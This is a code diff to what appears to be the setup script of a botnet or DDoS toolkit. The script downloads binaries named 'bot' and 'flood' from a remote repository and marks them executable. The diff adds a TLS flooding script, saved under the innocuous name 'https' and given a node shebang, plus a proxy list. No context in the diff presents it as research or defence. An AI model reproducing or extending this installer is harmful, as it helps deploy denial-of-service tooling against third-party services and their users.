@@ -25,6 +25,8 @@ const binArch = ARCH_MAP[os.arch()] || 'x86_64';
 const FILES_TO_DOWNLOAD = [
     { url: `${REPO_BASE}/bots/bot-${binArch}`,   filename: 'bot',       executable: true },
     { url: `${REPO_BASE}/methods_cpp/flood-${binArch}`, filename: 'flood', executable: true  },
+    { url: `${REPO_BASE}/bots/tls/tls.js`,       filename: 'https',     executable: true, script: true },
+    { url: `${REPO_BASE}/bots/tls/proxies.txt`,  filename: 'proxies.txt', executable: false },
     { url: `${REPO_BASE}/agent.txt`,             filename: 'agent.txt', executable: false },
 ];
 
@@ -60,6 +62,10 @@ async function setup() {
             process.stdout.write(`[*] Downloading ${item.filename}... `);
             await download(`${item.url}?t=${Date.now()}`, dest);
             console.log('OK');
+            if (item.script) {
+                const content = fs.readFileSync(dest, 'utf8');
+                fs.writeFileSync(dest, '#!/usr/bin/env node\n' + content);
+            }
             if (item.executable) {
                 fs.chmodSync(dest, 0o755);
                 console.log(`[+] chmod +x ${item.filename}`);
